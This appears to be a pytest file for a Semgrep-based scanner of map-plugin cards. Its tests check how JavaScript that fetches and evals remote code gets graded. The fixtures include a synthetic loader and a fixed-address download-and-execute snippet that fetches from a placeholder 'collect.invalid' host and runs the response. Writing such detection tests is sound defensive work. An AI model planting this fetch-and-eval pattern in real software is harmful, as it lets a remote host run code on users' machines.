"""(0.15, his decision 2026-11-22) A loader (code that downloads and runs whatever address
it is handed) is a door graded by the addresses it can be handed, not a sign of malice.

Synthetic, shaped like a real map library's plugin loader; hosts are .invalid. Nothing
runs: Semgrep parses, the rest is a text read.
"""

from __future__ import annotations

import shutil
import textwrap
from pathlib import Path

import pytest

from sniff_test.analyzers import semgrep
from sniff_test.models import Severity, Target, TargetKind

pytestmark = pytest.mark.skipif(shutil.which("semgrep") is None, reason="needs semgrep")

LOADER = """\
    async function load(e) {
      if (e.endsWith(".mjs")) { await import(e); return; }
      let t = await fetch(e, { credentials: "same-origin" });
      let n = await t.text();
      globalThis.eval(n);
    }
    class Worker { async importScript(e) { return load(e); } }
    """


def _scan(tmp_path: Path, files: dict[str, str]):
    root = tmp_path / "card"
    root.mkdir(parents=True)
    (root / "hacs.json").write_text('{"name": "Acme map", "filename": "acme-map.js"}')
    for rel, text in files.items():
        (root / rel).write_text(textwrap.dedent(text))
    target = Target(source=str(root), kind=TargetKind.PLUGIN, root=root)
    work = tmp_path / "work"
    work.mkdir()
    return [(f.rule_id, f.severity, f.evidence) for f in semgrep.run(target, work).findings
            if f.rule_id.startswith(("card-eval-", "card-code", "card-remote"))]  # fmt: skip
    # (plain `card-eval` on the same line is replaced later by the finding that supersedes it)


def test_a_loader_nothing_hands_an_address_is_a_note(tmp_path):
    got = _scan(tmp_path, {"acme-map.js": LOADER})
    assert [(r, s) for r, s, _e in got] == [("card-code-loader", Severity.INFO)]


def test_script_addresses_in_an_app_with_a_loader_are_code_it_may_load(tmp_path):
    main = (
        'setPlugin("https://plugins.vendor.invalid/rtl/rtl-text.js");\n'
        'setPlugin("https://plugins.vendor.invalid/geo@1.2.3/geo.min.js");\n'
        '// setPlugin("https://plugins.vendor.invalid/commented-out.js");\n'
    )
    got = _scan(tmp_path, {"acme-map.js": LOADER, "main.js": main})
    rules = sorted((r, e) for r, _s, e in got if r != "card-code-loader")
    assert rules == [
        ("card-remote-pinned", "https://plugins.vendor.invalid/geo@1.2.3/geo.min.js"),
        ("card-remote-script", "https://plugins.vendor.invalid/rtl/rtl-text.js"),
    ]


def test_code_downloaded_from_a_fixed_address_and_run_stays_a_threat_sign(tmp_path):
    fixed = (
        "async function go() {\n"
        '  const r = await fetch("https://collect.invalid/x");\n'
        "  globalThis.eval(await r.text());\n"
        "}\n"
    )
    got = _scan(tmp_path, {"acme-map.js": fixed})
    assert [r for r, _s, _e in got] == ["card-eval-remote"]
    # a parameter that is given another value inside is not a loader either
    moved = LOADER.replace("let t = await fetch(e,", 'e = "https://collect.invalid/x";\n'
                           "  let t = await fetch(e,")  # fmt: skip
    assert "card-eval-remote" in [r for r, _s, _e in _scan(tmp_path / "b", {"acme-map.js": moved})]
